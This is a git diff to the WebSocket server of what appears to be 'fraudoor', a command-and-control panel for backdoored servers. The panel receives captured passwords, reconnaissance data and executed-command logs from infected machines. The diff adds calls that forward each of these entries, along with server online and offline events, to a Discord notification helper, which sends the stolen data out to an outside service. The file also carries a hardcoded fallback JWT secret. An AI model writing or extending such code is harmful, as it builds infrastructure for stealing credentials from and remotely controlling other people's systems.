@@ -1,5 +1,6 @@
 import { v4 as uuidv4 } from 'uuid';
 import jwt from 'jsonwebtoken';
+import { sendDiscordNotification } from './discord.js';
 
 const JWT_SECRET = process.env.JWT_SECRET || 'fraudoor-dev-secret-change-in-production';
 
@@ -26,6 +27,7 @@ export function setupWebSocket(serverWss, store) {
       try {
         const decoded = jwt.verify(token, JWT_SECRET);
         ws._fraudoorUser = decoded;
+        ws._fraudoorRole = 'panel';
       } catch {}
     }
 
@@ -44,6 +46,7 @@ export function setupWebSocket(serverWss, store) {
         try {
           const decoded = jwt.verify(payload.token, JWT_SECRET);
           ws._fraudoorUser = decoded;
+          ws._fraudoorRole = 'panel';
           ws.send(JSON.stringify({ type: 'panel:auth:ok', payload: { user: decoded } }));
         } catch {
           ws.send(JSON.stringify({ type: 'panel:auth:error', payload: { error: 'invalid token' } }));
@@ -69,6 +72,7 @@ export function setupWebSocket(serverWss, store) {
               payload: { list: s.members.join(',') },
             }));
           }
+          sendDiscordNotification('server:online', payload);
           broadcastPanel({
             type: 'server:status',
             payload: {
@@ -127,6 +131,7 @@ export function setupWebSocket(serverWss, store) {
             timestamp: Date.now(),
           };
           store.addLog(entry);
+          sendDiscordNotification('command:exec', entry);
           broadcastPanel({
             type: 'panel:log:command',
             payload: entry,
@@ -147,6 +152,7 @@ export function setupWebSocket(serverWss, store) {
             timestamp: Date.now(),
           };
           store.addLog(entry);
+          sendDiscordNotification('password:capture', entry);
           broadcastPanel({
             type: 'panel:log:password',
             payload: entry,
@@ -168,6 +174,7 @@ export function setupWebSocket(serverWss, store) {
             timestamp: Date.now(),
           };
           store.addLog(entry);
+          sendDiscordNotification('recon:data', entry);
           broadcastPanel({
             type: 'panel:log:recon',
             payload: entry,
@@ -223,7 +230,7 @@ export function setupWebSocket(serverWss, store) {
 
         // --- Panel subscribes ---
         case 'panel:subscribe': {
-          ws._fraudoorRole = 'panel';
+          if (!ws._fraudoorRole) ws._fraudoorRole = 'panel';
           ws._fraudoorSubscribedServer = payload.serverId;
           ws.send(JSON.stringify({
             type: 'panel:subscribed',
@@ -313,6 +320,7 @@ export function setupWebSocket(serverWss, store) {
         const server = store.getServer(ws._fraudoorServerId);
         if (server) {
           store.addOrUpdateServer(ws._fraudoorServerId, { online: false, ws: null });
+          sendDiscordNotification('server:offline', { id: ws._fraudoorServerId });
           broadcastPanel({
             type: 'server:status',
             payload: { id: ws._fraudoorServerId, online: false },
